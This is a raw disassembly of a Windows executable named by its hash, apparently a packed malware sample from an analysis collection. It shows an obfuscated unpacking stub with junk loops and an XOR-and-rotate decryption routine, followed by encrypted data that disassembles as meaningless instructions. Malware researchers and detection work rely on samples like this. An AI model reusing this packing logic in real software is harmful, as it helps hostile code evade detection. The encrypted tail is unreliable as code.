
27ed0cd5ce1f247a93662b87ccdf2d203f10877d42659833ccb40b5255775a29.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    DWORD PTR ds:0x42b1de,0x13
  401013:	cmp    DWORD PTR ds:0x42b1de,0x0
  40101a:	je     0x401078
  401020:	cmp    DWORD PTR ds:0x42b1de,0x7
  401027:	jb     0x401078
  40102d:	jmp    0x401050
  401032:	push   0x42a019
  401037:	push   0x564d
  40103c:	push   DWORD PTR [ebp-0x28]
  40103f:	push   0x8804
  401044:	push   DWORD PTR [ebp-0x24]
  401047:	push   DWORD PTR [ebp-0x18]
  40104a:	call   DWORD PTR ds:0x42b2ea
  401050:	cmp    DWORD PTR ds:0x42b1de,0x8
  401057:	jne    0x401068
  40105d:	mov    eax,ds:0x42b1de
  401062:	dec    eax
  401063:	mov    ds:0x42b1de,eax
  401068:	mov    eax,ds:0x42b1de
  40106d:	dec    eax
  40106e:	mov    ds:0x42b1de,eax
  401073:	jmp    0x401013
  401078:	mov    eax,DWORD PTR [ebp+0x8]
  40107b:	mov    ecx,DWORD PTR ds:0x42b1be
  401081:	add    DWORD PTR ds:0x42b22a,ecx
  401087:	push   ebx
  401088:	and    DWORD PTR ds:0x42b21e,0x0
  401092:	xor    ecx,ecx
  401094:	or     ecx,DWORD PTR ds:0x42b21e
  40109a:	inc    ecx
  40109b:	mov    DWORD PTR ds:0x42b21e,ecx
  4010a1:	cmp    DWORD PTR ds:0x42b21e,0xc
  4010a8:	ja     0x4010ef
  4010ae:	jmp    0x4010c8
  4010b3:	push   0x42a03d
  4010b8:	push   0x0
  4010ba:	push   DWORD PTR [ebp-0xc]
  4010bd:	push   0x87c3
  4010c2:	call   DWORD PTR ds:0x42b2ee
  4010c8:	cmp    DWORD PTR ds:0x42b21e,0xb
  4010cf:	jne    0x4010e2
  4010d5:	mov    ecx,DWORD PTR ds:0x42b21e
  4010db:	inc    ecx
  4010dc:	mov    DWORD PTR ds:0x42b21e,ecx
  4010e2:	cmp    DWORD PTR ds:0x42b21e,0x1b
  4010e9:	jb     0x401092
  4010ef:	push   esi
  4010f0:	push   edi
  4010f1:	mov    esi,0x75108ae
  4010f6:	mov    DWORD PTR ds:0x42b1f6,0x15
  401100:	cmp    DWORD PTR ds:0x42b1f6,0x0
  401107:	je     0x401156
  40110d:	cmp    DWORD PTR ds:0x42b1f6,0x9
  401114:	jb     0x401156
  40111a:	jmp    0x40112a
  40111f:	push   0x7250
  401124:	call   DWORD PTR ds:0x42b2f2
  40112a:	cmp    DWORD PTR ds:0x42b1f6,0xa
  401131:	jne    0x401144
  401137:	mov    ecx,DWORD PTR ds:0x42b1f6
  40113d:	dec    ecx
  40113e:	mov    DWORD PTR ds:0x42b1f6,ecx
  401144:	mov    ecx,DWORD PTR ds:0x42b1f6
  40114a:	dec    ecx
  40114b:	mov    DWORD PTR ds:0x42b1f6,ecx
  401151:	jmp    0x401100
  401156:	xor    eax,esi
  401158:	mov    edi,0x3272f5
  40115d:	dec    DWORD PTR ds:0x42b19e
  401163:	add    eax,edi
  401165:	add    DWORD PTR ds:0x42b186,edi
  40116b:	mov    DWORD PTR [ebp-0x40],eax
  40116e:	mov    eax,ds:0x42a2f2
  401173:	xor    DWORD PTR ds:0x42b1aa,0x2d22
  40117d:	mov    eax,DWORD PTR [eax]
  40117f:	mov    ecx,DWORD PTR ds:0x42b22e
  401185:	sbb    ecx,DWORD PTR ds:0x42b1fe
  40118b:	mov    DWORD PTR ds:0x42b22e,ecx
  401191:	mov    DWORD PTR [ebp-0x3c],eax
  401194:	and    DWORD PTR ds:0x42b192,0x0
  40119e:	jmp    0x4011b0
  4011a3:	mov    ecx,DWORD PTR ds:0x42b192
  4011a9:	inc    ecx
  4011aa:	mov    DWORD PTR ds:0x42b192,ecx
  4011b0:	cmp    DWORD PTR ds:0x42b192,0x15
  4011b7:	jae    0x4011f9
  4011bd:	cmp    DWORD PTR ds:0x42b192,0x8
  4011c4:	jg     0x4011f9
  4011ca:	jmp    0x4011da
  4011cf:	push   0x42b1aa
  4011d4:	call   DWORD PTR ds:0x42b2f6
  4011da:	cmp    DWORD PTR ds:0x42b192,0x7
  4011e1:	jne    0x4011f4
  4011e7:	mov    ecx,DWORD PTR ds:0x42b192
  4011ed:	inc    ecx
  4011ee:	mov    DWORD PTR ds:0x42b192,ecx
  4011f4:	jmp    0x4011a3
  4011f9:	mov    eax,ds:0x42a502
  4011fe:	xor    DWORD PTR ds:0x42b182,0x12c5
  401208:	mov    eax,DWORD PTR [eax]
  40120a:	mov    DWORD PTR [ebp-0x1c],eax
  40120d:	mov    DWORD PTR ds:0x42b1da,0x1a
  401217:	cmp    DWORD PTR ds:0x42b1da,0x0
  40121e:	je     0x40127b
  401224:	cmp    DWORD PTR ds:0x42b1da,0x8
  40122b:	jl     0x40127b
  401231:	jmp    0x401250
  401236:	push   0x42b1ba
  40123b:	push   0x42b1d2
  401240:	push   0x8af3
  401245:	push   0x42a12c
  40124a:	call   DWORD PTR ds:0x42b2fa
  401250:	cmp    DWORD PTR ds:0x42b1da,0x9
  401257:	jne    0x40126b
  40125d:	xor    eax,eax
  40125f:	or     eax,DWORD PTR ds:0x42b1da
  401265:	dec    eax
  401266:	mov    ds:0x42b1da,eax
  40126b:	mov    eax,ds:0x42b1da
  401270:	dec    eax
  401271:	mov    ds:0x42b1da,eax
  401276:	jmp    0x401217
  40127b:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  401282:	mov    eax,DWORD PTR [ebp-0x34]
  401285:	xor    eax,esi
  401287:	xor    DWORD PTR ds:0x42b222,edi
  40128d:	add    eax,edi
  40128f:	or     ecx,DWORD PTR ds:0x42b222
  401295:	mov    DWORD PTR [ebp-0x40],eax
  401298:	adc    ecx,DWORD PTR ds:0x42b19a
  40129e:	mov    eax,ds:0x42a472
  4012a3:	xor    DWORD PTR ds:0x42b1d6,0x6afc
  4012ad:	mov    DWORD PTR [ebp-0x40],eax
  4012b0:	mov    eax,DWORD PTR [ebp-0x3c]
  4012b3:	mov    DWORD PTR [ebp-0x14],eax
  4012b6:	adc    eax,0x46d9
  4012bb:	mov    eax,DWORD PTR [ebp-0x14]
  4012be:	and    DWORD PTR ds:0x42b222,0x0
  4012c8:	jmp    0x4012da
  4012cd:	mov    ecx,DWORD PTR ds:0x42b222
  4012d3:	inc    ecx
  4012d4:	mov    DWORD PTR ds:0x42b222,ecx
  4012da:	cmp    DWORD PTR ds:0x42b222,0x1c
  4012e1:	jae    0x401328
  4012e7:	cmp    DWORD PTR ds:0x42b222,0x5
  4012ee:	jg     0x401328
  4012f4:	jmp    0x401309
  4012f9:	push   0x42b1e2
  4012fe:	push   0x42a2a1
  401303:	call   DWORD PTR ds:0x42b2fe
  401309:	cmp    DWORD PTR ds:0x42b222,0x4
  401310:	jne    0x401323
  401316:	mov    ecx,DWORD PTR ds:0x42b222
  40131c:	inc    ecx
  40131d:	mov    DWORD PTR ds:0x42b222,ecx
  401323:	jmp    0x4012cd
  401328:	push   0x4
  40132a:	or     DWORD PTR ds:0x42b186,0x3485
  401334:	pop    ecx
  401335:	and    DWORD PTR ds:0x42b206,0x42b1ee
  40133f:	sub    ecx,eax
  401341:	dec    eax
  401342:	add    ecx,DWORD PTR [ebp-0x1c]
  401345:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  40134c:	adc    DWORD PTR ds:0x42b20e,0x42b1e2
  401356:	mov    DWORD PTR [ebp-0x18],ecx
  401359:	mov    DWORD PTR [ebp-0xa0],0xf89c85a1
  401363:	or     DWORD PTR ds:0x42b182,0x6f89
  40136d:	mov    eax,DWORD PTR [ebp-0x14]
  401370:	xor    DWORD PTR ds:0x42b20e,0x6cd3
  40137a:	mov    DWORD PTR [ebp-0x9c],eax
  401380:	adc    eax,DWORD PTR ds:0x42b196
  401386:	mov    eax,DWORD PTR [ebp-0x18]
  401389:	and    DWORD PTR ds:0x42b22a,0x42b226
  401393:	mov    DWORD PTR [ebp-0x98],eax
  401399:	xor    DWORD PTR ds:0x42b186,ecx
  40139f:	mov    eax,DWORD PTR [ebp-0x2c]
  4013a2:	adc    DWORD PTR ds:0x42b1f6,0x42b22a
  4013ac:	xor    eax,esi
  4013ae:	add    eax,edi
  4013b0:	add    DWORD PTR ds:0x42b22e,0x47bc
  4013ba:	mov    DWORD PTR [ebp-0x94],eax
  4013c0:	and    DWORD PTR ds:0x42b20e,0x42b202
  4013ca:	lea    eax,[ebp-0x48]
  4013cd:	mov    DWORD PTR [ebp-0x90],eax
  4013d3:	add    eax,0x2eac
  4013d8:	mov    eax,DWORD PTR [ebp-0xa0]
  4013de:	xor    eax,esi
  4013e0:	sub    DWORD PTR ds:0x42b20e,0x42b1f6
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0xa0],eax
  4013f2:	inc    DWORD PTR ds:0x42b1ce
  4013f8:	lea    eax,[ebp-0xa0]
  4013fe:	add    DWORD PTR ds:0x42b1a6,0x42b21a
  401408:	push   eax
  401409:	sub    DWORD PTR ds:0x42b1fe,ebx
  40140f:	mov    eax,DWORD PTR [ebp+0xc]
  401412:	and    DWORD PTR ds:0x42b226,0xfdc
  40141c:	xor    eax,esi
  40141e:	add    eax,edi
  401420:	push   eax
  401421:	and    DWORD PTR ds:0x42b192,ecx
  401427:	mov    eax,ds:0x42a492
  40142c:	sub    DWORD PTR ds:0x42b1f6,0x42b1c6
  401436:	push   0x42a3e8
  40143b:	and    DWORD PTR ds:0x42b1c2,0x42b19e
  401445:	push   DWORD PTR [eax]
  401447:	call   0x4061fa
  40144c:	mov    ebx,DWORD PTR ds:0x42b226
  401452:	add    ebx,DWORD PTR ds:0x42b19a
  401458:	mov    DWORD PTR ds:0x42b226,ebx
  40145e:	mov    ebx,DWORD PTR [ebp-0x14]
  401461:	adc    edx,DWORD PTR ds:0x42b1da
  401467:	mov    eax,DWORD PTR [ebp-0x18]
  40146a:	and    DWORD PTR ds:0x42b1f2,0x0
  401474:	mov    edx,DWORD PTR ds:0x42b1f2
  40147a:	inc    edx
  40147b:	mov    DWORD PTR ds:0x42b1f2,edx
  401481:	cmp    DWORD PTR ds:0x42b1f2,0x8
  401488:	ja     0x4014d0
  40148e:	jmp    0x4014a9
  401493:	push   DWORD PTR [ebp-0x10]
  401496:	push   DWORD PTR [ebp-0x28]
  401499:	push   0x42a223
  40149e:	push   0x400000
  4014a3:	call   DWORD PTR ds:0x42b306
  4014a9:	cmp    DWORD PTR ds:0x42b1f2,0x7
  4014b0:	jne    0x4014c3
  4014b6:	mov    edx,DWORD PTR ds:0x42b1f2
  4014bc:	inc    edx
  4014bd:	mov    DWORD PTR ds:0x42b1f2,edx
  4014c3:	cmp    DWORD PTR ds:0x42b1f2,0x1e
  4014ca:	jb     0x401474
  4014d0:	mov    DWORD PTR [ebp-0x58],eax
  4014d3:	or     DWORD PTR ds:0x42b1ce,edi
  4014d9:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  4014e0:	sub    DWORD PTR ds:0x42b1f2,0x209f
  4014ea:	mov    eax,0xf89c85a3
  4014ef:	sbb    DWORD PTR ds:0x42b21a,0x6d23
  4014f9:	mov    DWORD PTR [ebp-0x1c],eax
  4014fc:	sub    DWORD PTR ds:0x42b206,ebx
  401502:	lea    ecx,[eax+0x2]
  401505:	adc    edx,0x42c6
  40150b:	mov    DWORD PTR [ebp-0x28],ecx
  40150e:	inc    edx
  40150f:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  401516:	or     edx,DWORD PTR ds:0x42b182
  40151c:	mov    DWORD PTR [ebp-0x8],eax
  40151f:	mov    edx,DWORD PTR ds:0x42b256
  401525:	xor    eax,eax
  401527:	xor    eax,DWORD PTR ds:0x42b276
  40152d:	sub    edx,eax
  40152f:	sub    edx,DWORD PTR [edx+eax*1]
  401532:	mov    eax,DWORD PTR [ebp-0x10]
  401535:	xor    DWORD PTR ds:0x42b1b2,edi
  40153b:	xor    eax,esi
  40153d:	sub    DWORD PTR ds:0x42b1be,ecx
  401543:	mov    edx,0xffcd8d8b
  401548:	sbb    DWORD PTR ds:0x42b182,0x343
  401552:	sub    edx,eax
  401554:	mov    DWORD PTR [ebp-0xc],edx
  401557:	mov    DWORD PTR [ebp-0x18],0xf89c85be
  40155e:	mov    eax,DWORD PTR [ebp-0x8]
  401561:	mov    DWORD PTR ds:0x42b216,0x6ef4
  40156b:	mov    DWORD PTR [ebp-0x3c],ebx
  40156e:	mov    DWORD PTR ds:0x42b206,0x4694
  401578:	cmp    eax,ecx
  40157a:	mov    DWORD PTR ds:0x42b21e,0x4f34
  401584:	je     0x401870
  40158a:	or     eax,DWORD PTR ds:0x42b22e
  401590:	mov    eax,DWORD PTR [ebp-0x10]
  401593:	and    DWORD PTR ds:0x42b21a,0x0
  40159d:	jmp    0x4015af
  4015a2:	mov    ecx,DWORD PTR ds:0x42b21a
  4015a8:	inc    ecx
  4015a9:	mov    DWORD PTR ds:0x42b21a,ecx
  4015af:	cmp    DWORD PTR ds:0x42b21a,0x1b
  4015b6:	jae    0x4015e4
  4015bc:	cmp    DWORD PTR ds:0x42b21a,0x1c
  4015c3:	jb     0x4015e4
  4015c9:	jmp    0x4015df
  4015ce:	push   0x42a211
  4015d3:	push   DWORD PTR [ebp-0x1c]
  4015d6:	push   DWORD PTR [ebp-0x14]
  4015d9:	call   DWORD PTR ds:0x42b30e
  4015df:	jmp    0x4015a2
  4015e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4015e7:	adc    DWORD PTR ds:0x42b196,0x5f31
  4015f1:	xor    eax,esi
  4015f3:	xor    ecx,esi
  4015f5:	or     DWORD PTR ds:0x42b1d6,0x22e1
  4015ff:	lea    ecx,[eax+ecx*1+0x64e5ea]
  401606:	mov    eax,ds:0x42b186
  40160b:	xor    DWORD PTR ds:0x42b1ee,eax
  401611:	mov    eax,DWORD PTR [ebp-0xc]
  401614:	xor    edx,edx
  401616:	xor    DWORD PTR ds:0x42b212,0x42b202
  401620:	div    ecx
  401622:	mov    eax,DWORD PTR [ebp-0x8]
  401625:	sub    DWORD PTR ds:0x42b192,edi
  40162b:	mov    ecx,DWORD PTR [ebp-0x10]
  40162e:	xor    eax,esi
  401630:	add    DWORD PTR ds:0x42b1c6,0x2cb7
  40163a:	xor    ecx,esi
  40163c:	sub    eax,ecx
  40163e:	mov    DWORD PTR ds:0x42b21a,0x2b73
  401648:	cmp    edx,eax
  40164a:	mov    DWORD PTR ds:0x42b21e,0x4704
  401654:	jne    0x40181a
  40165a:	mov    eax,DWORD PTR [ebp-0xc]
  40165d:	xor    ecx,0x1cf0
  401663:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  40166a:	mov    eax,DWORD PTR [ebp-0x28]
  40166d:	add    DWORD PTR ds:0x42b1ce,0x4d15
  401677:	mov    ecx,DWORD PTR [ebp-0x18]
  40167a:	or     DWORD PTR ds:0x42b18e,0x42b1ea
  401684:	xor    eax,esi
  401686:	add    DWORD PTR ds:0x42b18e,0x42b182
  401690:	xor    ecx,esi
  401692:	or     DWORD PTR ds:0x42b21a,0x42b1aa
  40169c:	add    eax,edi
  40169e:	adc    DWORD PTR ds:0x42b1e2,0x3afa
  4016a8:	add    ecx,edi
  4016aa:	mov    BYTE PTR [ebp-0x21],dl
  4016ad:	cmp    eax,ecx
  4016af:	jae    0x4017e8
  4016b5:	and    DWORD PTR ds:0x42b1fe,0x0
  4016bf:	mov    edx,DWORD PTR ds:0x42b1fe
  4016c5:	inc    edx
  4016c6:	mov    DWORD PTR ds:0x42b1fe,edx
  4016cc:	cmp    DWORD PTR ds:0x42b1fe,0x27
  4016d3:	ja     0x4016f6
  4016d9:	jmp    0x4016e9
  4016de:	push   0x18bf
  4016e3:	call   DWORD PTR ds:0x42b316
  4016e9:	cmp    DWORD PTR ds:0x42b1fe,0x18
  4016f0:	jb     0x4016bf
  4016f6:	lea    ecx,[eax-0x3272f5]
  4016fc:	adc    DWORD PTR ds:0x42b19e,0x3c59
  401706:	mov    DWORD PTR [ebp-0x14],ecx
  401709:	mov    edx,DWORD PTR [ebp-0x14]
  40170c:	xor    edx,esi
  40170e:	add    DWORD PTR ds:0x42b192,0x42b1fa
  401718:	add    edx,0x7f55d8e3
  40171e:	lea    ecx,[ebp+eax*4-0xb4]
  401725:	mov    DWORD PTR ds:0x42b1ca,0x6fb0
  40172f:	mov    DWORD PTR [ecx],edx
  401731:	mov    edx,DWORD PTR [ecx]
  401733:	cmp    edx,0x244ecb80
  401739:	mov    DWORD PTR ds:0x42b1e2,0xbe5
  401743:	jbe    0x40175e
  401749:	add    DWORD PTR [ecx],0x405fcc1
  40174f:	mov    DWORD PTR ds:0x42b1ca,0x62ff
  401759:	jmp    0x401764
  40175e:	add    DWORD PTR [ecx],0xfdaf433f
  401764:	sbb    DWORD PTR ds:0x42b1c2,0x1be5
  40176e:	mov    ecx,DWORD PTR [ebp-0x18]
  401771:	xor    DWORD PTR ds:0x42b1c6,0x42b18e
  40177b:	xor    ecx,esi
  40177d:	xor    DWORD PTR ds:0x42b1f6,0x42b192
  401787:	inc    eax
  401788:	inc    DWORD PTR [ebp-0x14]
  40178b:	adc    DWORD PTR ds:0x42b1b2,0x7e0f
  401795:	add    ecx,edi
  401797:	cmp    eax,ecx
  401799:	jb     0x401709
  40179f:	mov    DWORD PTR ds:0x42b192,0x13
  4017a9:	cmp    DWORD PTR ds:0x42b192,0x0
  4017b0:	je     0x4017e5
  4017b6:	cmp    DWORD PTR ds:0x42b192,0x20
  4017bd:	jl     0x4017e5
  4017c3:	jmp    0x4017d5
  4017c8:	push   0xd
  4017ca:	push   0x57ae
  4017cf:	call   DWORD PTR ds:0x42b31a
  4017d5:	mov    eax,ds:0x42b192
  4017da:	dec    eax
  4017db:	mov    ds:0x42b192,eax
  4017e0:	jmp    0x4017a9
  4017e5:	mov    dl,BYTE PTR [ebp-0x21]
  4017e8:	mov    eax,ds:0x42b226
  4017ed:	sub    eax,DWORD PTR ds:0x42b1ce
  4017f3:	mov    ds:0x42b226,eax
  4017f8:	mov    eax,DWORD PTR [ebp-0x34]
  4017fb:	xor    al,0xae
  4017fd:	mov    cl,0xb
  4017ff:	sub    cl,al
  401801:	add    dl,cl
  401803:	mov    ecx,DWORD PTR [ebp-0x1c]
  401806:	xor    cl,0xae
  401809:	sub    cl,0xb
  40180c:	ror    dl,cl
  40180e:	xor    eax,eax
  401810:	mov    eax,DWORD PTR [ebp-0xc]
  401813:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  40181a:	mov    eax,DWORD PTR [ebp-0xc]
  40181d:	mov    ecx,DWORD PTR [ebp-0x28]
  401820:	sub    eax,edi
  401822:	xor    eax,esi
  401824:	cmp    eax,ecx
  401826:	jne    0x401850
  40182c:	mov    eax,DWORD PTR [ebp-0x8]
  40182f:	mov    ecx,DWORD PTR [ebp-0x10]
  401832:	xor    eax,esi
  401834:	xor    ecx,esi
  401836:	sub    eax,ecx
  401838:	sub    eax,edi
  40183a:	xor    eax,esi
  40183c:	mov    DWORD PTR [ebp-0x8],eax
  40183f:	mov    eax,DWORD PTR [ebp-0x10]
  401842:	xor    eax,esi
  401844:	mov    ecx,0xffcd8d8b
  401849:	sub    ecx,eax
  40184b:	jmp    0x40185f
  401850:	mov    eax,DWORD PTR [ebp-0x10]
  401853:	xor    eax,esi
  401855:	mov    ecx,0xffcd8d0b
  40185a:	sub    ecx,eax
  40185c:	add    ecx,DWORD PTR [ebp-0xc]
  40185f:	mov    DWORD PTR [ebp-0xc],ecx
  401862:	mov    eax,DWORD PTR [ebp-0x8]
  401865:	cmp    eax,0xf89c85a5
  40186a:	jne    0x40158a
  401870:	mov    DWORD PTR [ebp-0x34],0x9
  401877:	mov    ecx,DWORD PTR [ebp+0x8]
  40187a:	xor    ecx,esi
  40187c:	add    ecx,edi
  40187e:	jmp    0x406188
  401883:	lea    eax,[ecx+ebx*1]
  401886:	mov    DWORD PTR [ebp-0x2c],eax
  401889:	mov    eax,DWORD PTR [ebp-0x58]
  40188c:	sub    eax,ecx
  40188e:	mov    DWORD PTR [ebp-0x1c],eax
  401891:	mov    eax,DWORD PTR [ebp-0x1c]
  401894:	mov    DWORD PTR [ebp-0x14],eax
  401897:	mov    eax,DWORD PTR [ebp-0x2c]
  40189a:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  4018a1:	mov    DWORD PTR [ebp-0x54],eax
  4018a4:	mov    DWORD PTR [ebp-0x20],0xf89c85a2
  4018ab:	mov    eax,DWORD PTR [ebp-0x38]
  4018ae:	xor    eax,esi
  4018b0:	add    eax,edi
  4018b2:	mov    DWORD PTR [ebp-0x10],eax
  4018b5:	mov    eax,DWORD PTR [ebp-0x38]
  4018b8:	xor    eax,esi
  4018ba:	add    eax,edi
  4018bc:	mov    DWORD PTR [ebp-0x8],eax
  4018bf:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  4018c6:	jmp    0x403c1b
  4018cb:	mov    al,0x2a
  4018cd:	dec    ecx
  4018ce:	and    ebp,eax
  4018d0:	adc    ch,BYTE PTR [eax-0x7dd88776]
  4018d6:	push   esi
  4018d7:	aas    
  4018d8:	and    eax,DWORD PTR [edi-0x7c7c7ca2]
  4018de:	or     DWORD PTR [ebx+0x5e],0xffffff83
  4018e2:	sub    DWORD PTR [eax],0x31
  4018e5:	es cmp al,0x24
  4018e8:	cmp    BYTE PTR [edx],ah
  4018ea:	cs js  0x401928
  4018ed:	je     0x401966
  4018ef:	in     eax,0x71
  4018f1:	jo     0x401966
  4018f3:	jo     0x401940
  4018f5:	fsub   st,st(1)
  4018f7:	cld    
  4018f8:	ins    DWORD PTR es:[edi],dx
  4018f9:	push   ebp
  4018fa:	jb     0x401978
  4018fc:	bound  ebp,QWORD PTR [ebp-0x319b8f83]
  401902:	pusha  
  401903:	push   ebx
  401904:	cmp    eax,0x87960391
  401909:	push   ax
  40190b:	jle    0x401953
  40190d:	lea    esi,[edi+0x42bbbd7e]
  401913:	xor    esi,edi
  401915:	ja     0x4018f8
  401917:	add    ebp,DWORD PTR [edx+0x7e]
  40191a:	pop    ds
  40191b:	lock inc esp
  40191d:	rol    bl,1
  40191f:	lock xchg esi,eax
  401921:	sub    bl,bh
  401923:	xchg   edx,eax
  401924:	xor    al,0xe
  401926:	fs mov dl,0x93
  401929:	fld    DWORD PTR [esi]
  40192b:	jo     0x40190d
  40192d:	sbb    ecx,ebp
  40192f:	lsl    esi,WORD PTR [edi]
  401932:	and    eax,0x72371155
  401937:	jne    0x4018fd
  401939:	scas   al,BYTE PTR es:[edi]
  40193a:	sub    bl,BYTE PTR [eax+ebx*1-0x49]
  40193e:	(bad)  
  40193f:	hlt    
  401940:	push   esp
  401941:	xor    cl,BYTE PTR [ecx+0x462d54b]
  401947:	and    eax,DWORD PTR [ebx]
  401949:	test   DWORD PTR [edx+edi*2-0x6da15a20],edi
  401950:	mov    esp,0x4c9b2916
  401955:	or     bl,BYTE PTR [edi+0x128a8b41]
  40195b:	jecxz  0x40198d
  40195d:	imul   edx,DWORD PTR [eax-0x596b5b7],0xffffffce
  401964:	xchg   ebx,eax
  401965:	xor    al,0x94
  401967:	int    0xc6
  401969:	rcl    DWORD PTR [ebp+0x6b58f96c],1
  40196f:	push   ecx
  401970:	adc    DWORD PTR [edi],edi
  401972:	or     al,BYTE PTR [edi+0x1a]
  401975:	mov    al,0x52
  401977:	shl    DWORD PTR [esi+0x6719dd4d],cl
  40197d:	add    BYTE PTR [ebx+0x67],ch
  401980:	mov    eax,0x5be7504
  401985:	pop    ebx
  401986:	and    al,0x41
  401988:	int3   
  401989:	sti    
  40198a:	fs push esp
  40198c:	retf   0xc6f
  40198f:	scas   al,BYTE PTR es:[edi]
  401990:	and    ebp,DWORD PTR [ebx-0x78]
  401993:	adc    BYTE PTR [eax+ebp*2+0x66],ch
  401997:	add    DWORD PTR [ecx+0x61be6f2f],ecx
  40199d:	and    al,0x29
  40199f:	mov    dh,bl
  4019a1:	push   edx
  4019a2:	push   ebx
  4019a3:	test   bl,al
  4019a5:	mov    edi,0x89fd9d7c
  4019aa:	leave  
  4019ab:	popf   
  4019ac:	call   DWORD PTR [edx-0x69]
  4019af:	xchg   ecx,eax
  4019b0:	cmc    
  4019b1:	int    0x8a
  4019b3:	daa    
  4019b4:	fimul  DWORD PTR [ebx-0x4e]
  4019b7:	push   ebx
  4019b8:	mov    ds:0xb4592d58,eax
  4019bd:	mov    esp,0x14c03443
  4019c2:	mov    fs,WORD PTR [ecx-0x56]
  4019c5:	ss jae 0x401966
  4019c8:	inc    ebx
  4019c9:	xor    eax,0xfddbe017
  4019ce:	mov    ah,0xd2
  4019d0:	push   ss
  4019d1:	stos   BYTE PTR es:[edi],al
  4019d2:	mov    ebx,0x5e3ad83
  4019d7:	mov    edx,0x570746fe
  4019dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019dd:	stos   BYTE PTR es:[edi],al
  4019de:	bound  ecx,QWORD PTR [esi-0x75f620f4]
  4019e4:	add    DWORD PTR [edx+0x5d],ebp
  4019e7:	iret   
  4019e8:	sub    bh,ch
  4019ea:	imul   ecx,DWORD PTR [edi-0x3afa5e05],0x153db194
  4019f4:	fwait
  4019f5:	test   DWORD PTR [ecx+edi*2],edi
  4019f8:	call   0xc7ac:0xb05cec01
  4019ff:	out    dx,eax
  401a00:	inc    ecx
  401a02:	(bad)  
  401a03:	ins    BYTE PTR es:[edi],dx
  401a04:	loope  0x401a46
  401a06:	ins    DWORD PTR es:[edi],dx
  401a07:	and    ebp,DWORD PTR [esi-0x10a4f513]
  401a0d:	enter  0xb530,0x4d
  401a11:	and    eax,0xe3ff1287
  401a16:	xchg   esp,eax
  401a17:	pop    esi
  401a18:	or     ch,al
  401a1a:	aam    0x6d
  401a1c:	pop    esp
  401a1d:	mov    ?,edi
  401a1f:	push   ss
  401a20:	call   0x5921dc14
  401a25:	jns    0x401a76
  401a27:	sbb    eax,0xacede437
  401a2c:	bnd call 0x5ca9cb76
  401a32:	inc    ebx
  401a33:	int3   
  401a34:	repz (bad) 
  401a36:	jle    0x4019c5
  401a38:	jb     0x401a41
  401a3a:	popa   
  401a3b:	das    
  401a3c:	cdq    
  401a3d:	ret    
  401a3e:	jg     0x401a71
  401a40:	sbb    ch,ah
  401a42:	mov    ds:0x7c741cc3,eax
  401a47:	imul   eax,DWORD PTR [ebx],0x20
  401a4a:	scas   eax,DWORD PTR es:[edi]
  401a4b:	rcl    ebx,1
  401a4d:	sub    ah,bl
  401a4f:	jo     0x401a60
  401a51:	jae    0x401a97
  401a53:	dec    eax
  401a54:	mov    ebx,0x90a14f9e
  401a59:	mov    bl,0x9f
  401a5b:	rol    DWORD PTR [esi],1
  401a5d:	jae    0x401abe
  401a5f:	(bad)
  401a62:	push   ecx
  401a63:	aaa    
  401a64:	loopne 0x4019fb
  401a66:	fdivp  st(4),st
  401a68:	aas    
  401a69:	add    bh,BYTE PTR [ebp+0x397d2327]
  401a6f:	and    DWORD PTR [edi],0x34
  401a72:	inc    esp
  401a73:	jp     0x401a92
  401a75:	pusha  
  401a76:	push   es
  401a77:	lods   eax,DWORD PTR ds:[esi]
  401a78:	mov    ebx,0xae695512
  401a7d:	rol    BYTE PTR [esi-0x3b5f1af4],cl
  401a83:	adc    ch,al
  401a85:	fild   WORD PTR [ebx+0x58bd96e0]
  401a8b:	sub    ebp,DWORD PTR [ecx+0x62]
  401a8e:	(bad)  
  401a8f:	fcomp  DWORD PTR [esi+0x3633415]
  401a95:	outs   dx,BYTE PTR ds:[esi]
  401a96:	in     eax,0x69
  401a98:	add    al,0x70
  401a9a:	lods   eax,DWORD PTR ds:[esi]
  401a9b:	jecxz  0x401ac4
  401a9d:	xchg   ecx,eax
  401a9e:	xchg   edx,eax
  401a9f:	and    DWORD PTR [ecx-0x5f],ebp
  401aa2:	jecxz  0x401aa2
  401aa4:	mov    dh,0x4d
  401aa6:	sub    eax,0xc3a7c53f
  401aab:	jbe    0x401a66
  401aad:	lds    ecx,FWORD PTR [edi]
  401aaf:	adc    al,0xd9
  401ab1:	(bad)  
  401ab2:	cmp    al,0x5d
  401ab4:	je     0x401a98
  401ab6:	jb     0x401abc
  401ab8:	cmp    esp,DWORD PTR [ebp-0x74]
  401abb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401abc:	nop
  401abd:	or     DWORD PTR ds:0x2db0befe,0x84c8a5bc
  401ac7:	arpl   WORD PTR es:[ebx],cx
  401aca:	jp     0x401a96
  401acc:	bound  ebp,QWORD PTR [ebp-0x66c60b]
  401ad2:	xor    DWORD PTR [esi+0x52c10d33],ebx
  401ad8:	loopne 0x401b51
  401ada:	(bad)  
  401adb:	sub    al,0x95
  401add:	in     eax,dx
  401ade:	cwde   
  401adf:	or     ecx,edi
  401ae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ae2:	adc    BYTE PTR [ebx+0x34a602ef],cl
  401ae8:	sub    ch,BYTE PTR [esi]
  401aea:	popf   
  401aeb:	xor    DWORD PTR [edi-0x3f],edx
  401aee:	rol    DWORD PTR [edx],1
  401af0:	mov    dh,0x40
  401af2:	pushf  
  401af3:	je     0x401af8
  401af5:	xor    BYTE PTR [edx],al
  401af7:	out    0x43,eax
  401af9:	xor    al,0x68
  401afb:	pop    edi
  401afc:	and    bh,dl
  401afe:	mov    ch,0x48
  401b00:	sub    DWORD PTR [edi+0x651e72b0],0x16742c64
  401b0a:	ret    
  401b0b:	and    DWORD PTR [edx],eax
  401b0d:	scas   al,BYTE PTR es:[edi]
  401b0e:	stc    
  401b0f:	inc    edi
  401b10:	inc    edi
